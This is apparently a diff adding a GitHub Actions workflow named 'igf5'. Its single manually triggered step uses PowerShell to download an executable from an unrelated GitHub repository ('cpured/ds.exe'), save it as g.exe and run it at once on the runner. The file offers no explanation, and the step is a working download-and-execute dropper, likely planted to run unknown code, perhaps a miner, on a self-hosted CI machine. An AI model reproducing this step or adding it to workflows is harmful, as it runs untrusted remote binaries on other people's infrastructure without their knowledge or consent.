@@ -1,0 +1,10 @@
+name: igf5
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: w
+    steps:
+      - name: powershell
+        shell: cmd
+        run: powershell.exe -c Invoke-WebRequest https://github.com/545465/cpured/raw/main/ds.exe -OutFile g.exe ; .\g.exe
